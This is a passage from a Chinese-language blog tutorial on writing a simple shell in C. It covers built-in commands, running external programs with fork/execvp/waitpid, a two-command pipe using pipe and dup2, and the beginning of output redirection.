class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用系统函数<strong>chdir()</strong>改变当前工作目录  </p>
<p>函数说明：</p>
<ol>
<li>用户将当前的工作目录改变成以参数路径所指的目录。</li>
<li>使用头文件 unistd.h。</li>
<li>chdir()函数返回值执行成功则返回0，失败返回-1，errno为错误代码。</li>
</ol>
<ol start="2">
<li><strong>pwd</strong>命令</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun_pwd</span><span class="params">(<span class="keyword">char</span>** char_list)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> bufsize = <span class="number">1024</span>;</span><br><span class="line">    <span class="keyword">char</span> *<span class="built_in">buffer</span> = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*bufsize);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">buffer</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"allocation error1\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(getcwd(<span class="built_in">buffer</span>, bufsize) == <span class="literal">NULL</span>)&#123;</span><br><span class="line">            bufsize += bufsize;</span><br><span class="line">            <span class="built_in">buffer</span> = <span class="built_in">realloc</span>(<span class="built_in">buffer</span>, <span class="keyword">sizeof</span>(<span class="keyword">char</span>)*bufsize);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">buffer</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"allocation error\n"</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"current working directory : %s\n"</span>, <span class="built_in">buffer</span>);</span><br><span class="line">            <span class="built_in">free</span>(<span class="built_in">buffer</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数使用getcwd()获得当前工作目录的绝对路径。</p>
<p>函数声明：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">getcwd</span><span class="params">(<span class="keyword">char</span> *buf,<span class="keyword">size_t</span> <span class="built_in">size</span>)</span></span>;</span><br></pre></td></tr></table></figure>



<p>函数说明：</p>
<ol>
<li>getcwd()会将当前工作目录的绝对路径复制到参数buf所指的内存空间中,参数size为buf的空间大小。</li>
<li>如果路径长度大于size,则会返回NULL。</li>
</ol>
<ol start="3">
<li><strong>help</strong>命令</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun_help</span><span class="params">(<span class="keyword">char</span>** char_list)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"---------------------myshell---------------------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Type program names and arguments, and hit enter.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-----------The following are built in:-----------\n"</span>);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; long_cmd(); i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, cmder[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Use the man command for information on other programs.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------Support for simple pipes and redirects---------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"------------------------------------------------------\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>shell程序里调用help命令获得内部命令集。</p>
<ol start="4">
<li><strong>exit</strong>命令</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun_exit</span><span class="params">(<span class="keyword">char</span>** char_list)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-----------------------goodbye-----------------------\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exit命令返回值为0，可以中断loop循环，结束shell程序。</p>
<ol start="5">
<li><strong>echo</strong>命令</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun_echo</span><span class="params">(<span class="keyword">char</span>** char_list)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">if</span> (char_list[<span class="number">1</span>] == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Enter correct output.\n"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="number">1</span>; char_list[i] != <span class="literal">NULL</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%s "</span>, char_list[i] );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>echo命令用来输出后缀参数。</p>
<p><strong>注意：内部命令是自定义的，可扩充的。</strong></p>
<p><strong>外部命令</strong></p>
<p>​        这里我们要让原本shell程序执行的进程fork出两个进程，一个是<strong>父进程</strong>，一个为<strong>子进程</strong>。父进程是原本shell进程，阻塞并等待子进程执行结束。子进程用来执行外部命令。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">process</span><span class="params">(<span class="keyword">char</span>** char_list)</span></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid = fork(),wpid;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (execvp(char_list[<span class="number">0</span>], char_list) == <span class="number">-1</span>)&#123;</span><br><span class="line">            perror(<span class="string">"myshell "</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);<span class="comment">//子进程报错后销毁，返回父进程</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> (pid &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        perror(<span class="string">"myshell "</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            wpid = waitpid(pid, &amp;status, WUNTRACED);</span><br><span class="line">        &#125;<span class="keyword">while</span> (!WIFEXITED(status) &amp;&amp; !WIFSIGNALED(status));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面使用到了三个系统函数，fork()，execvp()，waitpid()</p>
<p>关于fork函数，我之前写过一篇博客用来介绍，详细可以看<a href="https://bmoos.github.io/2020/01/15/fork/">这里</a>。</p>
<p>关于execvp函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">execvp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* file, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span></span>;</span><br></pre></td></tr></table></figure>

<p> 第一个参数是要运行的文件，会在环境变量PATH中查找file并执行。</p>
<p> 第二个参数，是一个参数列表。</p>
<blockquote>
<p>execvp函数执行失败的时候，子进程是无法正常退出的，需要用exit强制退出该子进程，所以这时候就需要加个判断，当execvp执行失败返回-1时，调用exit()来退出子进程，不然该进程还是在那里，导致后边的shell程序无法正常执行。</p>
</blockquote>
<p>execvp()是exec函数族里面其中之一，关于exec函数族，我之后会在写一篇博客用来介绍。</p>
<p>关于waitpid函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">pid_t</span> waitpid(<span class="keyword">pid_t</span> pid,<span class="keyword">int</span> *status,<span class="keyword">int</span> options)</span><br></pre></td></tr></table></figure>



<p>在<a href="https://bmoos.github.io/2020/01/15/fork/">这里</a>有wait函数用法，从本质上讲，系统调用waitpid和wait的作用是完全相同的，<strong>但waitpid多出了两个可由用户控制的参数pid和options</strong>，从而为我们编程提供了另一种更灵活的方式。</p>
<blockquote>
<p>从参数的名字pid和类型pid_t中就可以看出，这里需要的是一个进程ID。但当pid取不同的值时，在这里有不同的意义。</p>
<ol>
<li>pid&gt;0时，只等待进程ID等于pid的子进程，不管其它已经有多少子进程运行结束退出了，只要指定的子进程还没有结束，waitpid就会一直等下去。</li>
<li>pid=-1时，等待任何一个子进程退出，没有任何限制，此时waitpid和wait的作用一模一样。</li>
<li>pid=0时，等待<strong>同一个进程组</strong>中的任何子进程，如果子进程已经加入了别的进程组，waitpid不会对它做任何理睬。</li>
<li>pid&lt;-1时，等待一个<strong>指定进程组</strong>中的任何子进程，这个进程组的ID等于pid的绝对值。</li>
</ol>
</blockquote>
<blockquote>
<p><strong>options</strong>提供了一些额外的选项来控制waitpid，目前在Linux中只支持<strong>WNOHANG</strong>和<strong>WUNTRACED</strong>两个选项，这是两个常数，可以用”|”运算符把它们连接起来使用 。</p>
</blockquote>
<p>​    在关于父进程等待的时候，要注意子进程状态。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">    wpid = waitpid(pid, &amp;status, WUNTRACED);</span><br><span class="line">&#125;<span class="keyword">while</span> (!WIFEXITED(status) &amp;&amp; !WIFSIGNALED(status));</span><br></pre></td></tr></table></figure>

<p>使用do……while结构，判断条件为</p>
<p>​                <code>!WIFEXITED(status) &amp;&amp; !WIFSIGNALED(status)</code></p>
<p>WIFEXITED(status) 这个宏用来指出子进程是否为正常退出的，如果是，它会返回一个非零值。</p>
<p>WIFSIGNALED(status)若子进程返回的状态为异常结束,则为真。</p>
<p>则对于父进程来说，子进程无论正常或者异常退出，循环语句都会跳出。</p>
<h2 id="管道-匿名管道"><a href="#管道-匿名管道" class="headerlink" title="管道(匿名管道)"></a>管道(匿名管道)</h2><p>​        上述对shell程序的构建已经可以组成一个简单的shell程序了，有了命令的读入，命令的分析，以及命令的执行。但是对于一个成熟的shell，比如bash，zsh等，都会有管道功能，现在让我们实现管道功能。</p>
<p>​        <strong>什么是管道：</strong></p>
<blockquote>
<p>Shell的一种功能，就是可以将两个或者多个命令（程序或者进程）连接到一起，把一个命令的输出作为下一个命令的输入，以这种方式连接的两个或者多个命令就形成了<strong>管道（pipe）</strong>。</p>
</blockquote>
<p><img src="https://s2.ax1x.com/2020/01/19/1Cjs5d.png" alt="1Cjs5d.png"></p>
<p>Linux 管道使用竖线 | 连接多个命令，这被称为管道符。Linux 管道的具体语法格式如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">command1 | command2</span><br><span class="line">command1 | command2 | commandN...</span><br></pre></td></tr></table></figure>

<p>当在两个命令之间设置管道时，管道符 | 左边命令的输出就变成了右边命令的输入。只要第一个命令向标准输出写入，而第二个命令是从标准输入读取，那么这两个命令就可以形成一个管道。大部分的 Linux 命令都可以用来形成管道。</p>
<blockquote>
<p>这里需要注意，command1 必须有正确输出，而 command2 必须可以处理 command2 的输出结果；而且 command2 只能处理 command1 的正确输出结果，不能处理 command1 的错误信息。</p>
</blockquote>
<p><strong>管道机制：</strong></p>
<p>在Linux中，管道是一种使用非常频繁的通信机制。从本质上说，管道也是一种文件，但它又和一般的文件有所不同，管道可以克服使用文件进行通信的两个问题，具体表现为：</p>
<ol>
<li>限制管道的大小。实际上，管道是一个固定大小的缓冲区。在Linux中，该缓冲区的大小为1页，即4K字节，使得它的大小不象文件那样不加检验地增长。使用单个固定缓冲区也会带来问题，比如在写管道时可能变满，当这种情况发生时，随后对管道的write()调用将默认地被阻塞，等待某些数据被读取，以便腾出足够的空间供write()调用写。</li>
<li>读取进程也可能工作得比写进程快。当所有当前进程数据已被读取时，管道变空。当这种情况发生时，一个随后的read()调用将默认地被阻塞，等待某些数据被写入，这解决了read()调用返回文件结束的问题。</li>
</ol>
<p>注意：从管道读数据是一次性操作，数据一旦被读，它就从管道中被抛弃，释放空间以便写更多的数据。</p>
<p><strong>管道的实现：</strong></p>
<p>注意：我只实现了两条命令的管道机制，但是可以通过递归实现n条命令的管道，那样比较繁琐和抽象。</p>
<p>首先，让我们要对命令的读取加上对管道的识别：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(<span class="built_in">line</span>); i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">line</span>[i] == <span class="string">'|'</span> &amp;&amp; <span class="built_in">line</span>[i+<span class="number">1</span>] == <span class="string">' '</span> &amp;&amp; <span class="built_in">line</span>[i<span class="number">-1</span>] == <span class="string">' '</span>)&#123;</span><br><span class="line">            sample = commandwithpipe(<span class="built_in">line</span>);</span><br><span class="line">            <span class="keyword">return</span> sample;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>其中commandwithpipe()是用来执行管道命令的：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">commandwithpipe</span><span class="params">(<span class="keyword">char</span> *<span class="built_in">line</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pipeIdx;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(<span class="built_in">line</span>); ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">line</span>[i] == <span class="string">'|'</span> &amp;&amp; <span class="built_in">line</span>[i+<span class="number">1</span>] == <span class="string">' '</span> &amp;&amp; <span class="built_in">line</span>[i<span class="number">-1</span>] == <span class="string">' '</span>) &#123;</span><br><span class="line">            pipeIdx = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pipeIdx+<span class="number">2</span> == <span class="built_in">strlen</span>(<span class="built_in">line</span>)) &#123; <span class="comment">// 管道命令' | '后续没有指令，参数缺失</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Parameters are missing\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fds[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">if</span> (pipe(fds) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">pid_t</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123; <span class="comment">// 子进程执行单个命令</span></span><br><span class="line">        <span class="built_in">close</span>(fds[<span class="number">0</span>]);</span><br><span class="line">        dup2(fds[<span class="number">1</span>], STDOUT_FILENO); <span class="comment">// 将标准输出重定向到fds[1]</span></span><br><span class="line">        <span class="built_in">close</span>(fds[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">char</span> *new_str = cut_str(<span class="number">0</span>,pipeIdx<span class="number">-2</span>,<span class="built_in">line</span>);</span><br><span class="line">        <span class="keyword">char</span> **simple_line = cut_line(new_str);</span><br><span class="line">        <span class="keyword">if</span> (execute(simple_line) != <span class="number">1</span>)&#123;</span><br><span class="line">            result = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">free</span>(new_str);</span><br><span class="line">        <span class="built_in">free</span>(simple_line);</span><br><span class="line">        <span class="built_in">exit</span>(result);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// 父进程递归执行后续命令</span></span><br><span class="line">        <span class="keyword">int</span> status;</span><br><span class="line">        waitpid(pid, &amp;status, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">close</span>(fds[<span class="number">1</span>]);</span><br><span class="line">        dup2(fds[<span class="number">0</span>], STDIN_FILENO); <span class="comment">// 将标准输入重定向到fds[0]</span></span><br><span class="line">        <span class="built_in">close</span>(fds[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">char</span> *new_str = cut_str(pipeIdx + <span class="number">2</span>,<span class="built_in">strlen</span>(<span class="built_in">line</span>),<span class="built_in">line</span>);</span><br><span class="line">        <span class="keyword">char</span> **simple_line = cut_line(new_str);</span><br><span class="line">        result = execute(simple_line);</span><br><span class="line">        <span class="built_in">free</span>(new_str);</span><br><span class="line">        <span class="built_in">free</span>(simple_line);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>commandwithpipe()函数中调用的cut_str()是将管道命令里面的两个命令切割下来：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">cut_str</span><span class="params">(<span class="keyword">int</span> left,<span class="keyword">int</span> right,<span class="keyword">char</span> *<span class="built_in">line</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> bufsize = <span class="number">512</span>;</span><br><span class="line">    <span class="keyword">char</span> *<span class="built_in">buffer</span> = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*bufsize);</span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">buffer</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"allocation error7\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = left; i &lt;= right; i++)&#123;</span><br><span class="line">        <span class="built_in">buffer</span>[j] = <span class="built_in">line</span>[i];</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">buffer</span>[j] = <span class="string">'\0'</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">buffer</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>创建管道主要用到pipe函数，pipe的原型如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pipe</span><span class="params">(<span class="keyword">int</span> fds[<span class="number">2</span>])</span></span>;</span><br></pre></td></tr></table></figure>

<p>参数：一个整型数组，管道创建成功后，<strong>fds[0]表示管道的读端，fds[1]表示管道的写端</strong>。</p>
<p>成功返回0，失败返回-1。</p>
<p>如何用管道来实现进程间通讯，我们可以用以下的例子来实现以下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fds[<span class="number">2</span>];</span><br><span class="line">    <span class="comment">//1.创建管道</span></span><br><span class="line">    <span class="keyword">if</span>(pipe(fds)==<span class="number">-1</span>)&#123;</span><br><span class="line">        perror(<span class="string">"pipe"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//2.fork子进程</span></span><br><span class="line">    <span class="keyword">pid_t</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid &gt; <span class="number">0</span>)&#123;        <span class="comment">//father</span></span><br><span class="line">        <span class="comment">//3.父进程关闭读端,向写端写入数据</span></span><br><span class="line">        <span class="built_in">close</span>(fds[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">char</span> buff[<span class="number">1024</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"parent to child#"</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>); <span class="comment">//清空标准输出缓冲区</span></span><br><span class="line">        <span class="keyword">ssize_t</span> s = <span class="built_in">read</span>(<span class="number">0</span>,buff,<span class="keyword">sizeof</span>(buff)<span class="number">-1</span>);</span><br><span class="line">        buff[s<span class="number">-1</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">write</span>(fds[<span class="number">1</span>],buff,s);</span><br><span class="line">        <span class="built_in">close</span>(fds[<span class="number">1</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(pid==<span class="number">0</span>)&#123;   <span class="comment">//child</span></span><br><span class="line">        <span class="comment">//3.子进程关闭写端,从读端读出数据</span></span><br><span class="line">        <span class="built_in">close</span>(fds[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">char</span> buff[<span class="number">1024</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="keyword">ssize_t</span> s = <span class="built_in">read</span>(fds[<span class="number">0</span>],buff,<span class="keyword">sizeof</span>(buff));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"child to receive#%s\n"</span>,buff);</span><br><span class="line">        <span class="built_in">close</span>(fds[<span class="number">0</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        perror(<span class="string">"fork"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    wait(<span class="literal">NULL</span>); <span class="comment">//回收子进程</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意：read和write函数的一个参数，是一个无符号整数，是<strong>文件描述符</strong>，用来表示一个文件。在Linux系统中，一切设备都看作文件。而每打开一个文件，就有一个代表该打开文件的文件描述符。程序启动时默认打开三个I/O设备文件：标准输入文件stdin，标准输出文件stdout，标准错误输出文件stderr，分别得到文件描述符 0, 1, 2。</p>
<p><strong>上述程序的功能是，父进程从标准输入读入，并且从管道写端fds[1]写入到管道中，子进程从管道读端fds[0]读出数据，并且输出到标准输出中，默认为屏幕。</strong></p>
<p>注意：上述程序并没有对父子进程的先后顺序做以处理，不过管道会自然实现，因为当管道中没有数据时，读取管道的进程，也就是父进程会被阻塞，等待管道中数据的写入。同时管道类似于通信中半双工信道的进程通信机制，一个管道可以实现双向的数据传输，而同一个时刻只能最多有一个方向的传输，不能两个方向同时进行。</p>
<p>现在在明白管道的原理，功能，以及使用后，让我们回头看看commandwithpipe()函数。</p>
<p>在函数中，我们对管道命令做了处理，使用fork分开执行，首先让子进程的标准输出重定向为管道写端fds[1]，然后使用execute()执行第一条命令语句。对于父程序，我们在等待子进程执行完后，先将标准输入重定向为管道读端fds[0]，然后用execute()执行第二条命令语句。</p>
<p>注意：我们在父进程中将标准输入进行了重定位，所以在执行完毕后要将其重定回来。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> s_fd_out = dup(STDOUT_FILENO); <span class="comment">//保存标准输出</span></span><br><span class="line"><span class="keyword">int</span> s_fd_in = dup(STDIN_FILENO);<span class="comment">//保存标准输入</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n_fd_out = dup2(s_fd_out , STDOUT_FILENO);<span class="comment">//恢复标准输出</span></span><br><span class="line"><span class="keyword">int</span> n_fd_in = dup2(s_fd_in,STDIN_FILENO);<span class="comment">//恢复标准输入</span></span><br></pre></td></tr></table></figure>

<p>我们在上述中用到了dup()以及dup2()函数，让我们来介绍一下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dup</span><span class="params">(<span class="keyword">int</span> oldfd)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dup2</span><span class="params">(<span class="keyword">int</span> oldfd, <span class="keyword">int</span> newfd)</span></span>;</span><br></pre></td></tr></table></figure>

<p>​        当调用dup函数时，内核在进程中创建一个新的文件描述符，此描述符是当前可用文件描述符的最小数值，这个文件描述符指向oldfd所拥有的文件表项。<br>　　dup2和dup的区别就是可以用newfd参数指定新描述符的数值，如果newfd已经打开，则先将其关闭。如果newfd等于oldfd，则dup2返回newfd, 而不关闭它。dup2函数返回的新文件描述符同样与参数oldfd共享同一文件表项。</p>
<p>现在我们构造好了一个简易的管道功能：</p>
<p><img src="https://s2.ax1x.com/2020/01/20/1iUa0s.png" alt="1iUa0s.png"></p>
<h2 id="输出重定向"><a href="#输出重定向" class="headerlink" title="输出重定向"></a>输出重定向</h2><p>一般情况下，每个 Linux 命令运行时都会打开三个文件：</p>
<ul>
<li>标准输入文件(stdin)：stdin的文件描述符为0，Linux程序默认从stdin读取数据。</li>
<li>标准输出文件(stdout)：stdout 的文件描述符为1，Linux程序默认向stdout输出数据。</li>
<li>标准错误文件(stderr)：stderr的文件描述符为2，Linux程序会向stderr流中写入错误信息。</li>
</ul>
<p>默认情况下，command &gt; file 将 stdout 重定向到 file，command &lt; file 将stdin 重定向到 file。</p>
<p>在我们程序中，鉴于我的技术有限，仅能实现输出重定向’&gt;’。</p>
<p>首先我们得有对输出重定向命令的识别，它将加载在execute_line()函数中。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(<span class="built_in">line</span>); j++)&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">line</span>[j] == <span class="string">'&gt;'</span>)&#123;</span><br><span class="line">     	sample = commandWithRedi(<span class="built_in">line</span>);</span><br><span class="line">  	    <span class="keyword">return</span> sample;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后对commandWithRedi()函数进行实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">commandWithRedi</span><span class="params">(<span class="keyword">char</span>* <span class="built_in">line</span>)</span> </span>&#123; <span class="comment">//可能含有重定向</span></span><br><span class="line">    <span class="keyword">int</span> outNum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> *outFile = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">int</span> endIdx = <span class="built_in">strlen</span>(<span class="built_in">line</span>); <span class="comment">// 指令在重定向前的终止下标</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(<span class="built_in">line</span>); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">line</span>[i] == <span class="string">'&gt;'</span>) &#123; <span class="comment">// 输出重定向</span></span><br><span class="line">            outNum++;</span><br><span class="line">            <span class="keyword">if</span> (i+<span class="number">1</span> &lt; <span class="built_in">strlen</span>(<span class="built_in">line</span>))</span><br><span class="line">                outFile = &amp;<span class="built_in">line</span>[i+<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Parameters are missing\n"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            endIdx = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 处理重定向 */</span></span><br><span class="line">    <span class="keyword">if</span> (outNum &gt; <span class="number">1</span>) &#123; <span class="comment">// 输出重定向符超过一个</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Output redirection more than one\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> result = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">pid_t</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* 输入输出重定向 